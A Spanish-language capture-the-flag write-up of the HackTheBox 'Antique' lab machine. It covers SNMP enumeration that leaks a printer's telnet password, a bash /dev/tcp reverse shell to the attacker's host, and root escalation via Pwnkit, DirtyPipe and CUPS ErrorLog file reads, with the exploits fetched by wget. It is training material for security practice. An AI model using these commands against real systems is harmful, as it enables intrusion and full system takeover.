---
title: HackTheBox - Antique
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'SNMP Enumeration', 'Pwnkit (CVE-2021-4034)', 'DirtyPipe (CVE-2022-0847)', 'Cups (CVE-2012-5519)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Antique/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Antique Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **Linux, SNMP Enumeration, Pwnkit (CVE-2021-4034), DirtyPipe (CVE-2022-0847), Cups (CVE-2012-5519)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos tanto **TCP** como **UDP**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Antique/01-ports.png)


* **`nmap -sU --top-ports 1000 -Pn -n <IP> -oG puertos_udp`**

    ![](/assets/images/HTB/Easy/Antique/01-ports-udp.png)


b. Al conectarnos con telnet al puerto 23 nos pedirá una contraseña para continuar, pero, al no tenerla inspeccionamos el servicio **`SNMP`**

> **Protocolo Simple de Gestión de Red** (SNMP), fue creado para monitorear dispositivos en red. Se usa para manejar la configuración de tareas y cambiar configuraciones remotamente. Algunos dispositivos son compatibles como routers, switches, servidores o dispositivos IoT.
{: .prompt-info }

c. Al configurar dispositivos puede que exista información sobre los procesos y en ciertos casos credenciales. Así que, enumeraremos el servicio **`SNMP`** para tratar de conseguir información disponible, para esto debemos poseer una **`community string`**, algo así como una contraseña.

```bash
nmap -sU -p 161 --script 'snmp-*' <IP Antique>

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|   <empty> - Valid credentials
|   cascade - Valid credentials
|   secret - Valid credentials
|   rmonmgmtuicommunity - Valid credentials
|   ANYCOM - Valid credentials
|   volition - Valid credentials
|   ILMI - Valid credentials
|   TENmanUFactOryPOWER - Valid credentials
|   MiniAP - Valid credentials
|   PRIVATE - Valid credentials
|   admin - Valid credentials
|   private - Valid credentials
|   public - Valid credentials
|   PUBLIC - Valid credentials
|   snmpd - Valid credentials
|   cisco - Valid credentials
|   mngt - Valid credentials
|_  snmp-Trap - Valid credentials

snmpwalk -v2c -c secret 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
```

Al buscar por cualquiera de las **`community strings`** siempre obtendremos el mismo resultado, por lo que indagamos más sobre este servicio [SNMP - Basics](https://www.manageengine.com/latam/network-monitoring/tutorial-fundamentos-protocolo-snmp.html)

d. Nos mencionan que sigue una estructura de árbol, y **`snmpwalk`** no enumera desde la raíz, así que le indicamos que queremos obtener toda la información posible desde la raíz

```bash
snmpwalk -v2c -c secret 10.10.11.107 1

SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
> Obtenemos la información en formato **hexadecimal**, para verla en texto claro usamos **`xxd -r -p`**
{: .prompt-tip }

e. Una vez con la contraseña en texto claro nos autenticamos en el servicio **telnet**

```bash
telnet <IP Antique>
HP JetDirect

Password: P@ssw0rd@123!!123
Please type "?" for HELP
> ?
<SNIP>
exec: execute system commands (exec id)
```

Podemos ejecutar comandos, por lo que nos entablaremos una reverse shell

```bash
> exec bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"
-----------------------------------------------------------
nc -lvnp 4444
lp@antique:~$
```

### Escalada de Privilegios 💹

Para escalar privilegios existen múltiples formas, primero usaremos [**Pwnkit**](https://github.com/berdav/CVE-2021-4034)

a. Primero, movemos los ficheros necesarios a la **Máquina Antique**

```bash
python -m http.server 80
--------------------------------------
lp@antique:/home/lp$ wget http://<tun0 IP>/cve-2021-4034.c -o-
lp@antique:/home/lp$ wget http://<tun0 IP>/Makefile -o-
lp@antique:/home/lp$ wget http://<tun0 IP>/pwnkit.c -o-
lp@antique:/home/lp$ make
lp@antique:/home/lp/backup$ chmod +x cve-2021-4034
lp@antique:/home/lp/backup$ ./cve-2021-4034
# whoami
root
```

b. La segunda forma se consigue al usar [**DirtyPipe**](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits), usaremos el **exploit-1.c**

```bash
lp@antique:~$ wget http://10.10.14.18/poc.c -o-
lp@antique:~$ gcc poc.c -o exploit
lp@antique:~$ chmod +x exploit
lp@antique:~$ ./exploit
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
whoami
root
```

c. Veremos los puertos abiertos en la máquina y buscaremos algún exploit para [**CUPS**](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read)

```bash
lp@antique:~$ netstat -nat
<SNIP>
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN

lp@antique:~$ curl http://127.0.0.1:631
<SNIP>
<P><A HREF="help/whatsnew.html">What's New in CUPS 1.6</A></P>
```

```bash
lp@antique:~$ cupsctl ErrorLog=/root/root.txt
lp@antique:~$ curl -s 127.0.0.1:631/admin/log/error_log?

b901e1e1f279e8d3160bebd097f37ddd
```